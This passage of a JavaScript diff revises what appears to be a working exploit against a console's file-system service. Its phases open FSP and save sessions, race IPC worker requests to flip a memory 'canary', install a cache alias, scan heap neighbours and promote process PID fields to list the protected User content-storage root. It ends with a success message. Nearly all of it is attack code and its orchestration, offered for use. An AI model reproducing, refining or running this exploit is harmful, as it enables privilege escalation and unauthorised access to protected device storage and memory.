-            " qualifiedFlip=" + Boolean(record.qualifiedFlip) +
-            " post=" + (health.transport == null
-                ? "NA" : formatCode(health.transport)) + "/" +
-                (health.result == null ? "NA" : formatCode(health.result)) +
-                "/t" + formatCanaryType(health.type) +
-                "/healthy=" + Boolean(health.healthy) +
-            " preRelease=" + preRelease +
-            " margin=" + margin +
-            " shape=" + record.shape + "/10" +
-            " trigger=" + trigger + "/t" +
-                formatCanaryType(record.triggerType) +
-                "/aborted=" + Boolean(record.triggerAborted) +
-            " changed=" + ((record.changedPaths || []).join(",") || "none") +
-            " gates=" + ((record.rejections || []).join(",") || "-") +
-            " spans(us=relative-to-trigger):" + timingParts.join(","));
-    }
-}
-
-function formatAliasResult(alias) {
-    if (alias.aliasInstalled) {
-        return "Cache alias installed (" + alias.copyStepsCompleted +
-            "/7 copy steps; waves=" + alias.copyWavesTotal +").";
-    }
-    const reasons = Object.keys(alias.copyFailureCounts || {}).sort()
-        .map(reason => reason + ":" + alias.copyFailureCounts[reason])
-        .join(",") || "none";
-    const failedSteps = (alias.copyStepFailures || []).map(step =>
-        "step" + step.step + "{reason=" + step.reason +
-        ",attempts=" + step.attempts +
-        ",windowRejects=" + step.windowRejects +
-        ",preReleaseRejects=" + step.preReleaseRejects +
-        ",pathMismatches=" + step.pathMismatches + "}")
-        .join(",") || "none";
-    return "Cache alias was not installed (" + alias.copyStepsCompleted +
-        "/7 copy steps; waves=" + alias.copyWavesTotal +
-        "; worker state " + (alias.workerStateSafe ? "safe" : "unsafe") +
-        "; reason=" + (alias.copyFailureReason || "unknown") +
-        "; failures={" + reasons + "}; failedSteps={" + failedSteps + "}).";
-}
-
-function promotionSkipReason(address, handles) {
-    if (!address.addressReadVerified) return "address-read-not-qualified";
-    if (!address.rootStageVerified) return "root-identity-not-verified";
-    if (!address.verifiedIdentityTargets) return "identity-targets-unavailable";
-    if (!handles.domainSession) return "domain-session-unavailable";
-    if (!handles.candidateHandle) return "candidate-storage-unavailable";
-    if (!address.addressPlan) return "address-plan-unavailable";
-    return "promotion-precondition-failed";
-}
-
-function formatPromotionResult(promotion, address, handles) {
-    const outcome = promotion.promotionOutcome;
-    const pidStatus = outcome && outcome.promoted ? "verified" :
-        (promotion.promotionAttempted ? "failed" : "skipped");
-    const userFsStatus = !promotion.promotionAttempted || !outcome?.promoted
-        ? "not attempted" :
-        (outcome && outcome.openedUserFs ? "opened" : "failed");
-    const listingStatus = !outcome || !outcome.promoted || !outcome.openedUserFs
-        ? "not attempted" :
-        (outcome.listedUserRoot ? "read" : "failed");
-    const restoreStatus = !promotion.promotionAttempted ? "not needed" :
-        (promotion.promotionRestored ? "verified" : "failed");
-    let message = "PID fields " + pidStatus +
-        "; User filesystem " + userFsStatus +
-        "; root listing " + listingStatus;
-    if (outcome && outcome.listedUserRoot)
-        message += "(" + outcome.listCount + " entries)";
-    message += "; restore=" + restoreStatus;
-    if (!promotion.promotionAttempted)
-        message += "; reason=" + promotionSkipReason(address, handles).replace(/-/g, " ");
-    if (outcome && outcome.error)
-        message += "; reason=" + outcome.error;
-    if (outcome && !promotion.promotionRestored &&
-        outcome.restoreFailureDetails?.length)
-        message += "; restoreFailures={" +
-            outcome.restoreFailureDetails.join(",") + "}";
-    if (outcome && outcome.openedUserFs && !outcome.listedUserRoot)
-        message += "; listError=" + formatCode(outcome.listResult) +
-            "; listTransport=" + formatCode(outcome.listTransport) +
-            "; entriesRead=" + outcome.listEntriesRead;
-    if (promotion.promotionAttempted && outcome && outcome.promoted && !outcome.openedUserFs)
-        message += "; openError=" + outcome.error +
-            "; transport=" + formatCode(outcome.openTransport) +
-            "; result=" + formatCode(outcome.openResult) +
-            "; objects=" + outcome.openObjects;
-    if (outcome && outcome.fsCloseResult !== undefined &&
-        outcome.fsCloseResult !== 0)
-        message += "; UserFS-closeError=" + formatCode(outcome.fsCloseResult);
-    return message;
-}
-
-function formatCleanupResult(cleanup, workerStateSafe) {
-    const counts = "handlesClosed=" + cleanup.handlesClosed + "/" +
-        cleanup.expectedHandles;
-    if (cleanup.cleanupVerified)
-        return "Cleanup complete (" + counts + ").";
-    if (cleanup.skipped) {
-        return "Cleanup skipped (worker state " +
-            (workerStateSafe ? "safe" : "unsafe") + "; reason=" +
-            (cleanup.skipReason || "unknown").replace(/-/g, " ") +
-            "; " + counts + ").";
-    }
-    return "Cleanup failed (" + counts +
-        "; deleteTransport=" + formatCode(cleanup.deleteTransport) +
-        "; deleteResult=" + formatCode(cleanup.deleteResult) +
-        "; commitTransport=" + formatCode(cleanup.commitTransport) +
-        "; commitResult=" + formatCode(cleanup.commitResult) +
-        "; closeErrors=" + ((cleanup.closeErrors || []).join(",") || "none") +
-        "; errors=" + ((cleanup.errors || []).join(",") || "none") + ").";
-}
-
-function formatRetirementResult(retired) {
-    if (!retired?.ok || retired?.failureReason) {
-        return "Endpoint retirement or close failed (reason=" +
-            (retired?.failureReason || "cleanup-safety-not-verified") +
-            "; close=" + formatCode(retired?.candidateCloseResult) + ").";
-    }
-    if (retired.candidateCacheRetired)
-        return "Candidate cache retired and candidate storage closed.";
-    if (!retired.candidateHandle)
-        return "Endpoint retirement was not needed; candidate storage closed.";
-    return "Endpoint retirement is incomplete; candidate storage remains open.";
-}
-
-async function performStopAndCleanup({
-    reason,
-    scratch,
-    handles,
-    helpers,
-    addressCopy = null,
-    candidateCacheNeedsRetirement = false,
-    workerStateSafe = true,
-    domainSession = null
-}) {
-    await emitStage(reason);
-
-    let retired = {
-        addressCopy,
-        candidateHandle: handles?.candidateHandle || 0,
-        candidateCacheRetired: Boolean(addressCopy?.candidateCacheRetired),
-        workerStateSafe: Boolean(workerStateSafe)
-    };
-    if (retired.candidateHandle) {
-        await emitStage("Retiring the candidate cache before cleanup...");
-        retired = await retireCandidateCacheAndClose({
-            helpers,
-            addressCopy,
-            candidateCacheNeedsRetirement:
-                candidateCacheNeedsRetirement ||
-                Boolean(addressCopy?.candidateCacheNeedsRetirement),
-            candidateHandle: retired.candidateHandle,
-            retireRetainedEndpoint: null,
-            workerStateSafe: Boolean(workerStateSafe)
-        });
-        await emitStage(formatRetirementResult(retired));
-    }
-
-    const finalAddressCopy = retired.addressCopy || addressCopy || {};
-    const finalWorkerStateSafe = Boolean(
-        retired.workerStateSafe ?? workerStateSafe);
-    await emitStage("Removing save:/hole and closing the remaining handles...");
-    const cleanup = await cleanupScratchAndHandles({
-        SCRATCH_DIR: scratch?.SCRATCH_DIR,
-        auxiliaryStorageHandle: handles?.auxiliaryStorageHandle || 0,
-        candidateHandle: retired.candidateHandle || 0,
-        candidateCacheNeedsRetirement: candidateCacheNeedsRetirement ||
-            Boolean(finalAddressCopy.candidateCacheNeedsRetirement),
-        candidateCacheRetired: Boolean(retired.candidateCacheRetired ||
-            finalAddressCopy.candidateCacheRetired),
-        retainedEndpointActive: Boolean(finalAddressCopy.retainedEndpointActive),
-        domainSession: domainSession || handles?.domainSession || null,
-        extentTriggerHandle: handles?.extentTriggerHandle || 0,
-        extraStorages: handles?.extraStorages || [],
-        pinHandle: handles?.pinHandle || 0,
-        rootClones: handles?.rootClones || [],
-        rootSession: handles?.rootSession || 0,
-        saveClones: handles?.saveClones || [],
-        savedHandle: handles?.savedHandle || 0,
-        storageHandle: handles?.storageHandle || 0,
-        temporaryHandle: handles?.preserveTemporaryHandleForCleanup
-            ? 0 : handles?.temporaryHandle || 0,
-        triggerHandle: handles?.triggerHandle || 0,
-        workerStateSafe: finalWorkerStateSafe
-    });
-    await emitStage(formatCleanupResult(cleanup, finalWorkerStateSafe));
-    return {retired, cleanup};
-}
-
-function recordCleanupState(attemptState, result, workerStateSafe,
-    candidateCacheNeedsRetirement) {
-    const retired = result?.retired;
-    const cleanup = result?.cleanup;
-    const retirementVerified = Boolean(retired && retired.ok !== false &&
-        !retired.failureReason && retired.candidateHandle === 0 &&
-        (!candidateCacheNeedsRetirement || retired.candidateCacheRetired ||
-            retired.addressCopy?.candidateCacheRetired));
-    attemptState.primaryCleanupAttempted = cleanup?.attempted === true;
-    attemptState.primaryCommitVerified = cleanup?.commitTransport === 0 &&
-        cleanup?.commitResult === 0;
-    attemptState.primaryScratchCleanupVerified =
-        cleanup?.attempted === true && cleanup?.deleteTransport === 0 &&
-        cleanup?.deleteResult === 0 && cleanup?.commitTransport === 0 &&
-        cleanup?.commitResult === 0;
-    attemptState.primaryHandlesClosed = Boolean(cleanup?.attempted === true &&
-        cleanup.handlesClosed === cleanup.expectedHandles &&
-        (cleanup.closeErrors || []).length === 0);
-    attemptState.endpointRetirementVerified = retirementVerified;
-    attemptState.workerStateSafe = Boolean(workerStateSafe === true &&
-        retired?.workerStateSafe === true && cleanup?.workerStateSafe === true);
-    attemptState.cleanupVerified = Boolean(retirementVerified &&
-        cleanup?.cleanupVerified === true && attemptState.workerStateSafe);
-    attemptState.safeToRetry = false;
-    attemptState.cleanupSummary = attemptState.cleanupVerified
-        ? "cache retired, save scratch deleted and committed, all handles closed"
-        : "cleanup not fully verified";
-}
-
-async function runTrackedAttempt(attemptNumber) {
-    currentAttemptNumber = attemptNumber;
+async function runTrackedAttempt(canaryTimingSchedule,
+    allowTimingAdjustments = true) {
     const attemptState = {
         permissionProven: false,
+        pidPromotionVerified: false,
+        canaryTimingSchedule: copyCanaryTimingSchedule(canaryTimingSchedule),
+        positiveAttempts: 0,
+        positiveWindows: 0,
+        timingAdjustments: [],
         promotionRestored: false,
         cleanupVerified: false,
-        workerStateSafe: false,
+        workerStateSafe: true,
+        workersQuiesced: true,
         safeToRetry: false,
         cleanupSummary: "no cleanup record",
         memoryCleanupVerified: false,
         nativeMemory: null,
+        promotionRetained: false,
+        lightCleanupVerified: false,
         holeCleanupHandle: 0,
+        holeAbsentVerified: false,
         holeCleanupVerified: false,
         primaryCleanupAttempted: false,
         primaryCommitVerified: false,
         primaryScratchCleanupVerified: false,
         primaryHandlesClosed: false,
-        endpointRetirementVerified: false
+        endpointRetirementVerified: false,
+        cacheRetirementVerified: true,
+        candidateCacheRetirementRequired: false,
+        retainedEndpointActive: false,
+        cleanupLogStarted: false
     };
+
     const tracker = beginAllocationTracking();
     if (!tracker) {
-        await emitStage("STOP: allocation tracking is already active; no attempt started.");
+        await emitStage("Could not start an attempt. Stopping.");
         return attemptState;
     }
 
     let trackingEnded = false;
     let executionError = null;
+
     try {
-        await emitStage("Starting a fresh campaign.");
-        await runPayload(attemptState);
+        await runPayload(attemptState, allowTimingAdjustments);
     } catch (error) {
-        executionError = String(error?.message || error);
-        await emitStage("Workflow threw: " + executionError);
+        const errorName = error?.name && error.name !== "Error"
+            ? error.name + ": " : "";
+        executionError = errorName + String(error?.message || error);
+        await emitStage("Attempt failed: " + executionError +
+            "; checking cleanup.");
+        await emitVerboseStage("Attempt error: " + executionError);
     } finally {
         try {
+            await beginCleanupLog(attemptState);
             await runHoleCleanupHandler(attemptState);
         } catch (error) {
             executionError = executionError ||
                 "independent /hole cleanup threw: " +
                 String(error?.message || error);
+            await emitVerboseStage("Cleanup error: " + executionError);
         } finally {
             trackingEnded = endAllocationTracking(tracker);
         }
     }
 
+    // Client-side buffers only need to outlive their workers and any retained
+    // endpoint. Handle-close and scratch-cleanup failures do not keep those
+    // buffers in use once all synchronous requests have returned.
     let nativeMemory = {ok: false, attempted: tracker.length,
         callsCompleted: 0, errors: [], skipped: true};
-    if (attemptState.cleanupVerified && attemptState.workerStateSafe &&
-        attemptState.holeCleanupVerified && trackingEnded) {
+
+    if (!attemptState.promotionRetained &&
+        !attemptState.retainedEndpointActive &&
+        attemptState.workersQuiesced && trackingEnded) {
         try {
             nativeMemory = {...freeTrackedAllocations(tracker), skipped: false};
         } catch (error) {
@@ -965,74 +298,84 @@ async function runTrackedAttempt(attemptNumber) {
                 callsCompleted: 0, errors: [String(error)], skipped: false};
         }
     }
+
     attemptState.nativeMemory = nativeMemory;
     attemptState.memoryCleanupVerified = Boolean(trackingEnded && nativeMemory.ok);
-    attemptState.safeToRetry = Boolean(attemptState.cleanupVerified &&
-        attemptState.workerStateSafe && attemptState.holeCleanupVerified &&
-        trackingEnded && nativeMemory.ok);
+    attemptState.safeToRetry = Boolean(!attemptState.promotionRetained &&
+        !attemptState.pidPromotionVerified &&
+        !attemptState.retainedEndpointActive &&
+        attemptState.cacheRetirementVerified &&
+        attemptState.workerStateSafe && attemptState.workersQuiesced &&
+        attemptState.holeAbsentVerified && trackingEnded && nativeMemory.ok);
 
-    await emitStage("Attempt cleanup: " + attemptState.cleanupSummary +
-        "; independentHole=" +
-        (attemptState.holeCleanupVerified ? "verified" : "failed") +
-        "; workerState=" + (attemptState.workerStateSafe ? "safe" : "unsafe") +
-        "; nativeFreeCalls=" + nativeMemory.callsCompleted + "/" +
-        nativeMemory.attempted +
-        (nativeMemory.ok ? " returned" : nativeMemory.skipped
-            ? " skipped" : " failed") +
-        (trackingEnded ? "" : "; allocation tracking did not close") + ".");
+    if (attemptState.promotionRetained) {
+        const lightCleanupComplete = attemptState.lightCleanupVerified &&
+            attemptState.holeCleanupVerified && trackingEnded;
+        await emitStage(lightCleanupComplete
+            ? "Temporary handles closed; fspSrv and candidate storage remain open."
+            : "Cleanup incomplete; fspSrv and candidate storage remain open.");
+    } else if (attemptState.pidPromotionVerified) {
+        const cleanupComplete = attemptState.cleanupVerified &&
+            attemptState.holeCleanupVerified && trackingEnded &&
+            attemptState.promotionTestHandlesClosed;
+        await emitStage(cleanupComplete
+            ? "Promotion complete; temporary handles closed; PID fields remain promoted."
+            : "Promotion complete; cleanup incomplete; PID fields remain promoted.");
+    } else if (attemptState.safeToRetry) {
+        await emitStage(attemptState.cleanupVerified
+            ? "Cleanup complete."
+            : "Cleanup is sufficient for another attempt.");
+    } else {
+        await emitStage("Cleanup failed; another attempt is unsafe.");
+    }
+
     if (executionError)
-        await emitStage("Attempt ended after an exception; retry eligibility still " +
-            "requires verified cleanup and native frees.");
+        await emitVerboseStage("Attempt ended after an error; retry checks are incomplete.");
+
+    const completedWithCleanSession = Boolean(
+        !executionError &&
+        attemptState.permissionProven &&
+        attemptState.promotionRetained &&
+        attemptState.lightCleanupVerified &&
+        attemptState.holeCleanupVerified &&
+        trackingEnded);
+    if (completedWithCleanSession) {
+        await clearVisualLog();
+        await emitStage("You just Civ Sevened your machine, congrats");
+        for (const line of formatFinalTimingSchedule(
+            attemptState.canaryTimingSchedule)) {
+            await emitStage(line);
+        }
+    }
+
     return attemptState;
 }
 
-export async function run() {
-    const previousLogPolicy = setLogPolicy(stageOnlyLog);
-    try {
-        await emitStage("Bounded self-retry enabled; maximum=" + MAX_ATTEMPTS +
-            "; success requires a successful User content-storage root listing.");
-        for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
-            const result = await runTrackedAttempt(attempt);
-            if (result.permissionProven) {
-                if (result.promotionRestored && result.safeToRetry) {
-                    await emitStage("SUCCESS: User content-storage root listing " +
-                        "verified; PID restoration, endpoint retirement, save " +
-                        "cleanup, independent /hole verification, handle closure, " +
-                        "and tracked frees all passed.");
-                } else {
-                    await emitStage("STOP: User content-storage proof succeeded, " +
-                        "but restoration or complete cleanup was not verified; " +
-                        "no retry will run.");
-                }
-                return;
-            }
-            if (!result.safeToRetry) {
-                await emitStage("STOP: permission proof is absent and this attempt " +
-                    "is not safe to repeat (" + result.cleanupSummary +"); no retry.");
-                return;
-            }
-            if (attempt === MAX_ATTEMPTS) {
-                await emitStage("CAP: no User content-storage proof after " +
-                    MAX_ATTEMPTS + " attempts; last cleanup was verified.");
-                return;
-            }
-            await emitStage("RETRY: permission proof is absent; attempt cleanup and " +
-                "independent /hole verification and native frees are verified. " +
-                "Waiting " + RETRY_PAUSE_MS + " ms before attempt " +
-                (attempt + 1) + ".");
-            currentAttemptNumber = 0;
-            await waitMs(RETRY_PAUSE_MS);
-        }
-    } catch (error) {
-        await emitStage("Workflow aborted: " + String(error?.message || error));
-    } finally {
-        currentAttemptNumber = 0;
-        setLogPolicy(previousLogPolicy);
-    }
-}
 
-async function runPayload(attemptState) {
+// ---------------------------------------------------------------------------
+// Main payload (single attempt)
+// ---------------------------------------------------------------------------
+
+async function runPayload(attemptState, allowTimingAdjustments = true) {
     const config = createFspIdentityConfig();
+    const timingBaseline = {
+        roleDelays: config.roleDelays.slice(),
+        guardDelays: config.guardDelays.slice()
+    };
+    const carriedSchedule = copyCanaryTimingSchedule(
+        attemptState.canaryTimingSchedule);
+    if (carriedSchedule &&
+        carriedSchedule.roleDelays.length === config.roleDelays.length &&
+        carriedSchedule.guardDelays.length === config.guardDelays.length &&
+        carriedSchedule.baselineRoleDelays.length === config.roleDelays.length &&
+        carriedSchedule.baselineGuardDelays.length === config.guardDelays.length) {
+        config.roleDelays.splice(0, config.roleDelays.length,
+            ...carriedSchedule.roleDelays);
+        config.guardDelays.splice(0, config.guardDelays.length,
+            ...carriedSchedule.guardDelays);
+        timingBaseline.roleDelays = carriedSchedule.baselineRoleDelays;
+        timingBaseline.guardDelays = carriedSchedule.baselineGuardDelays;
+    }
     const helpers = createFspIdentityHelpers({
         optimizeRootCandidateScan: true,
         collectRootScanTiming: true
@@ -1040,31 +383,36 @@ async function runPayload(attemptState) {
 
     if (typeof checkWindow !== "function" ||
         typeof extractRoleTimings !== "function") {
-        await emitStage("Wave timing helpers are unavailable; setup cannot continue.");
+        await emitStage("Timing support is unavailable. Stopping.");
         return;
     }
 
-    await emitStage("Preparing FSP and save resources...");
+    // -- Phase 1: FSP and save resources --------------------------------
+
+    await emitStage("Preparing file-system access and save data...");
+
     const schedulingResult = await borrowRawThreadScheduling();
     if (!schedulingResult?.ok) {
-        await emitStage("Raw worker scheduling failed" +
-            formatFailureSuffix(schedulingResult) + ".");
+        await emitStage("Could not prepare worker scheduling.");
+        await emitVerboseStage(formatFailureSuffix(schedulingResult));
         return;
     }
     const {rawScheduling} = schedulingResult;
 
     const sessionSetup = await openFspSessions({helpers});
     if (!sessionSetup?.ok) {
-        await emitStage("Could not open the FSP or save sessions" +
-            formatFailureSuffix(sessionSetup) + ".");
+        await emitStage("Could not open the required file systems.");
+        await emitVerboseStage(formatFailureSuffix(sessionSetup));
         return;
     }
+
     let handles = {...sessionSetup.handles,
         preserveTemporaryHandleForCleanup: true};
     attemptState.holeCleanupHandle = handles.temporaryHandle || 0;
+
     if (!attemptState.holeCleanupHandle) {
-        await emitStage("No independent /hole cleanup handle; stopping before " +
-            "scratch creation or worker setup.");
+        await emitStage("Cleanup access is unavailable. Stopping safely.");
+        await beginCleanupLog(attemptState);
         helpers.cleanup(handles);
         return;
     }
@@ -1077,23 +425,39 @@ async function runPayload(attemptState) {
         handleResources: handles
     });
     if (!scratch?.ok) {
-        await emitStage("Could not prepare the save:/hole scratch tree" +
-            formatFailureSuffix(scratch) + ".");
+        await emitStage("Could not prepare temporary save data.");
+        await emitVerboseStage(formatFailureSuffix(scratch));
         return;
     }
+
+    // -- Guarded cleanup wrapper ----------------------------------------
 
     let cleanupAttempted = false;
     let cleanupWorkerStateSafe = true;
     let addressCopy = null;
+
     const stopAndCleanup = async options => {
         cleanupAttempted = true;
-        const result = await performStopAndCleanup(options);
-        recordCleanupState(attemptState, result, options.workerStateSafe,
-            Boolean(options.candidateCacheNeedsRetirement ||
-                options.addressCopy?.candidateCacheNeedsRetirement));
+        await beginCleanupLog(attemptState);
+        await emitVerboseStage("Stopping reason: " + options.reason);
+        // Cleanup may itself launch cache-retirement waves. If that throws,
+        // keep the allocation scope alive because a worker may still use it.
+        attemptState.workersQuiesced = false;
+        const cleanupOptions = {...options,
+            candidateCacheNeedsRetirement: Boolean(
+                options.candidateCacheNeedsRetirement ||
+                attemptState.candidateCacheRetirementRequired)};
+        const result = await performStopAndCleanup(cleanupOptions);
+        recordCleanupState(attemptState, result, cleanupOptions.workerStateSafe,
+            Boolean(cleanupOptions.candidateCacheNeedsRetirement ||
+                cleanupOptions.addressCopy?.candidateCacheNeedsRetirement));
         return result;
     };
+
     try {
+
+    // -- Phase 2: storage handles and clones ----------------------------
+
     const storageSetup = await openStorageAndClones({
         helpers, SCRATCH_DIR: scratch.SCRATCH_DIR,
         rootSession: handles.rootSession,
@@ -1101,9 +465,9 @@ async function runPayload(attemptState) {
         handleResources: handles
     });
     if (!storageSetup?.ok) {
-        cleanupAttempted = true; // This step already removed /hole and closed handles.
-        await emitStage("Could not open the storage or clone handles" +
-            formatFailureSuffix(storageSetup) + ".");
+        cleanupAttempted = true;
+        await emitStage("Could not prepare storage access.");
+        await emitVerboseStage(formatFailureSuffix(storageSetup));
         return;
     }
     handles = {...handles, ...storageSetup};
@@ -1115,21 +479,25 @@ async function runPayload(attemptState) {
         handleResources: handles
     });
     if (!triggerSetup?.ok) {
-        cleanupAttempted = true; // This step already removed /hole and closed handles.
-        await emitStage("Could not open the trigger handles" +
-            formatFailureSuffix(triggerSetup) + ".");
+        cleanupAttempted = true;
+        await emitStage("Could not prepare file handles.");
+        await emitVerboseStage(formatFailureSuffix(triggerSetup));
         return;
     }
     handles = {...handles, ...triggerSetup};
-    await emitStage("FSP and save resources are ready.");
 
-    await emitStage("Preparing IPC requests and worker resources...");
+    await emitStage("File-system access and save data are ready.");
+
+    // -- Phase 3: IPC requests and workers ------------------------------
+
+    await emitStage("Preparing workers...");
+
     const buffers = allocatePacketBuffers({
         config, SCRATCH_DIR: scratch.SCRATCH_DIR,
         canaryPath: scratch.canaryPath
     });
     if (!buffers?.ok) {
-        await emitStage("Could not allocate the packet buffers.");
+        await emitStage("Could not prepare worker buffers.");
         return;
     }
 
@@ -1145,7 +513,7 @@ async function runPayload(attemptState) {
         triggerBuf: buffers.triggerBuf
     });
     if (!packets?.ok) {
-        await emitStage("Could not build the IPC request packets.");
+        await emitStage("Could not prepare worker requests.");
         return;
     }
 
@@ -1158,9 +526,9 @@ async function runPayload(attemptState) {
         handleResources: handles
     });
     if (!pathPair?.ok) {
-        cleanupAttempted = true; // This step already removed /hole and closed handles.
-        await emitStage("Path-pair control or auxiliary storage setup failed" +
-            formatFailureSuffix(pathPair) + ".");
+        cleanupAttempted = true;
+        await emitStage("Could not prepare auxiliary storage.");
+        await emitVerboseStage(formatFailureSuffix(pathPair));
         return;
     }
     handles = {...handles, ...pathPair};
@@ -1170,7 +538,7 @@ async function runPayload(attemptState) {
         pinPkt: packets.pinPkt, prePkt: packets.prePkt
     });
     if (!cmifSetup?.ok) {
-        await emitStage("Could not apply the IPC message contexts.");
+        await emitStage("Could not prepare worker requests.");
         return;
     }
 
@@ -1185,13 +553,17 @@ async function runPayload(attemptState) {
         triggerHandle: handles.triggerHandle
     });
     if (!waveInfrastructure?.ok) {
-        await emitStage("Could not prepare the workers and synchronization gates.");
+        await emitStage("Could not start the workers.");
         return;
     }
-    await emitStage("IPC requests and worker resources are ready.");
 
-    await emitStage("Looking for a qualified canary flip...");
+    await emitStage("Workers are ready.");
+
+    // -- Phase 4: canary attempt -----------------------------------------
+
+    await emitStage("Checking the canary window...");
     cleanupWorkerStateSafe = false;
+
     const control = await runControlWaveLoop({
         config, helpers, REQ: packets.REQ,
         dirtyFilePath: scratch.dirtyFilePath,
@@ -1220,32 +592,62 @@ async function runPayload(attemptState) {
         selectedDir: scratch.selectedDir,
         setupPath: scratch.setupPath, setupPkt: scratch.setupPkt,
         triggerBuf: buffers.triggerBuf,
-        reportProgress: emitCanaryProgress
+        timingBaseline,
+        allowTimingAdjustments
     });
+
     cleanupWorkerStateSafe = control?.workerStateSafe === true;
-    await emitStage(formatCanaryResult(control, config));
-    // These lines consume records already collected by the wave loop. They
-    // are emitted only after it finishes, so they cannot shift wave timing.
-    await emitPositiveWindowDiagnostics(control, config);
+    attemptState.positiveAttempts = control?.positiveAttempts || 0;
+    attemptState.positiveWindows = control?.positiveWindows || 0;
+    attemptState.timingAdjustments = control?.timingAdjustments || [];
+    attemptState.canaryTimingSchedule = copyCanaryTimingSchedule(
+        control?.timingSchedule) || attemptState.canaryTimingSchedule;
+    const hasTimingAdjustment = Boolean(control?.timingAdjustments?.length);
+    let canaryStageMessage;
+    if (control?.canaryQualified) {
+        canaryStageMessage = "CANARY FLIPPED";
+    } else if (control?.positiveWindows) {
+        canaryStageMessage = "Canary did not flip.";
+        if (hasTimingAdjustment) {
+            canaryStageMessage +=
+                " Timing will be adjusted for the next attempt.";
+        }
+    } else {
+        canaryStageMessage = "No valid canary window was found.";
+        if (hasTimingAdjustment) {
+            canaryStageMessage +=
+                " Timing will be adjusted for the next attempt.";
+        }
+    }
+
+    await emitStage(canaryStageMessage);
+    await emitVerboseStage(formatCanaryResult(control, config));
     handles = {...handles, pinHandle: control?.pinHandle || handles.pinHandle};
+
     if (!control?.ok) {
         await stopAndCleanup({
-            reason: "Canary campaign stopped before qualification; skipping later phases.",
+            reason: "Canary attempt stopped before qualification; " +
+                "skipping later phases.",
             scratch, handles, helpers,
             workerStateSafe: control?.workerStateSafe === true
         });
         return;
     }
+
     if (control.canaryQualified !== true) {
         await stopAndCleanup({
-            reason: "Canary did not flip; skipping candidate storage, cache alias, heap scan, address qualification and promotion.",
+            reason: "Canary did not flip; skipping candidate storage, " +
+                "cache alias, heap scan, address qualification and promotion.",
             scratch, handles, helpers,
             workerStateSafe: control.workerStateSafe
         });
         return;
     }
 
+    // -- Phase 5: candidate storage -------------------------------------
+
     await emitStage("Preparing candidate storage...");
+
     const candidateSetup = await preparePostCanaryCandidate({
         config, helpers, canaryQualified: control.canaryQualified,
         pktBuf: pktBuf,
@@ -1253,32 +655,40 @@ async function runPayload(attemptState) {
         storageHandle: handles.storageHandle,
         workerStateSafe: control.workerStateSafe
     });
+
     if (candidateSetup?.candidateHandle && candidateSetup?.primeHex &&
         !candidateSetup?.failureReason) {
-        await emitStage("Candidate storage is ready.");
+        await emitStage("CANDIDATE STORAGE IS READY");
     } else if (candidateSetup?.candidateHandle && candidateSetup?.primeHex) {
-        await emitStage("Candidate storage opened, but its verification failed " +
-            "(reason=" + candidateSetup.failureReason + ").");
+        await emitStage("Candidate storage verification failed.");
     } else {
-        await emitStage("Candidate storage is unavailable (reason=" +
-            (candidateSetup?.failureReason || "unknown") + ").");
+        await emitStage("Candidate storage is unavailable.");
     }
-    handles = {...handles,
-        candidateHandle: candidateSetup?.candidateHandle || 0};
+    await emitVerboseStage("Candidate storage: " +
+        (candidateSetup?.failureReason || "verified"));
+
+    handles = {...handles, candidateHandle: candidateSetup?.candidateHandle || 0};
+
     if (!candidateSetup?.ok || candidateSetup.canaryQualified !== true ||
         !candidateSetup.candidateHandle || !candidateSetup.primeHex ||
         candidateSetup.failureReason) {
         await stopAndCleanup({
-            reason: "Candidate storage is not fully qualified; skipping cache alias and later phases.",
+            reason: "Candidate storage is not fully qualified; " +
+                "skipping cache alias and later phases.",
             scratch, handles, helpers,
             workerStateSafe: control.workerStateSafe
         });
         return;
     }
 
-    await emitStage("Installing the cache alias...");
+    // -- Phase 6: cache alias -------------------------------------------
+
+    await emitStage("Installing the memory alias...");
     const aliasStartedAt = Date.now();
     cleanupWorkerStateSafe = false;
+    attemptState.candidateCacheRetirementRequired = true;
+    attemptState.cacheRetirementVerified = false;
+
     const alias = await installCacheAlias({
         config, helpers, REQ: packets.REQ,
         canaryQualified: candidateSetup.canaryQualified,
@@ -1310,11 +720,17 @@ async function runPayload(attemptState) {
         preSendIndex: waveInfrastructure.preSendIndex,
         setupPath: scratch.setupPath, setupPkt: scratch.setupPkt,
         triggerBuf: buffers.triggerBuf,
-        reportProgress: emitProgress
+        reportProgress: emitStage
     });
+
     cleanupWorkerStateSafe = alias?.workerStateSafe === true;
     const aliasElapsedMs = Date.now() - aliasStartedAt;
-    await emitStage(formatAliasResult(alias) +
+    await emitStage(alias?.aliasInstalled
+        ? "MEMORY ALIAS INSTALLED"
+        : alias?.copyStepsCompleted
+            ? "Memory alias installation is incomplete."
+            : "Memory alias could not be installed.");
+    await emitVerboseStage(formatAliasResult(alias) +
         formatAliasTiming(alias, aliasElapsedMs));
 
     const analysisResources = {
@@ -1334,10 +750,13 @@ async function runPayload(attemptState) {
         savedHandle: handles.savedHandle,
         setupPath: scratch.setupPath, setupPkt: scratch.setupPkt
     };
+
     addressCopy = {
         config, REQ: packets.REQ,
         candidateCacheNeedsRetirement:
             Boolean(alias?.candidateCacheNeedsRetirement),
+        primeHex: candidateSetup.primeHex,
+        aliasControlHex: candidateSetup.aliasControlHex,
         copyWavesTotal: alias?.copyWavesTotal || 0,
         dirtyFilePath: scratch.dirtyFilePath,
         dirtyWriteBuf: control.dirtyWriteBuf,
@@ -1358,10 +777,11 @@ async function runPayload(attemptState) {
         triggerBuf: buffers.triggerBuf,
         analysis: analysisResources
     };
-    if (!alias?.ok || (!alias.aliasInstalled &&
-        alias.copyStepsCompleted === 0)) {
+
+    if (!alias?.ok || !alias.aliasInstalled) {
         await stopAndCleanup({
-            reason: "Cache alias produced no completed copy step; skipping heap and address scans.",
+            reason: "Cache alias installation was incomplete; " +
+                "skipping memory search and address qualification.",
             scratch, handles, helpers, addressCopy,
             candidateCacheNeedsRetirement:
                 Boolean(alias?.candidateCacheNeedsRetirement),
@@ -1370,38 +790,22 @@ async function runPayload(attemptState) {
         return;
     }
 
-    await emitStage("Preparing heap-neighbor storages...");
+    // -- Phase 7: heap neighbors and pointer scan -----------------------
+
+    await emitStage("Preparing memory search...");
+
     const releaseSetup = await prepareReleaseNeighbors({
         aliasInstalled: alias.aliasInstalled,
         candidateHandle: handles.candidateHandle,
         config, copyStepsCompleted: alias.copyStepsCompleted,
         rootSession: handles.rootSession
     });
+
     if (!releaseSetup?.ok) {
-        await emitStage("Could not prepare the heap-neighbor storages.");
+        await emitStage("Could not prepare memory search.");
         await stopAndCleanup({
-            reason: "Neighbor storage setup failed; skipping heap and address scans.",
